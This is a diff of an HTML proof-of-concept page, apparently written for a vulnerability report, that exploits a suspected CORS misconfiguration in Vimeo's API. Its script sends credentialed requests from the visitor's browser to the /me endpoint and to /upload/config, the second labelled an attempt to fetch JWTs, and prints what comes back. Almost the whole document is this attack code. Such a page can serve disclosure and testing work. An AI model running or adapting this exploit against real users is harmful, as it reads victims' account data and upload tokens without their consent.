@@ -1,25 +1,36 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Vimeo CORS PoC</title>
+  <title>Vimeo CORS Misconfiguration Dual PoC</title>
 </head>
 <body>
-  <h1>Testing Vimeo CORS Misconfiguration</h1>
-  <pre id="output">Loading...</pre>
+  <h1>Vimeo CORS Misconfiguration Demo</h1>
+
+  <h2>Step 1: /me (baseline account data)</h2>
+  <pre id="me-output">Loading...</pre>
+
+  <h2>Step 2: /upload/config (attempt to fetch JWTs)</h2>
+  <pre id="config-output">Loading...</pre>
 
   <script>
-    (async () => {
+    async function fetchEndpoint(url, outputId) {
       try {
-        const res = await fetch("https://api.vimeo.com/me", {
+        const res = await fetch(url, {
           method: "GET",
           credentials: "include"
         });
         const text = await res.text();
-        document.getElementById("output").textContent = text;
+        document.getElementById(outputId).textContent = text;
       } catch (e) {
-        document.getElementById("output").textContent = "Error: " + e;
+        document.getElementById(outputId).textContent = "Error: " + e;
       }
-    })();
+    }
+
+    // Step 1: fetch /me
+    fetchEndpoint("https://api.vimeo.com/me", "me-output");
+
+    // Step 2: fetch /upload/config
+    fetchEndpoint("https://api.vimeo.com/upload/config", "config-output");
   </script>
 </body>
 </html>
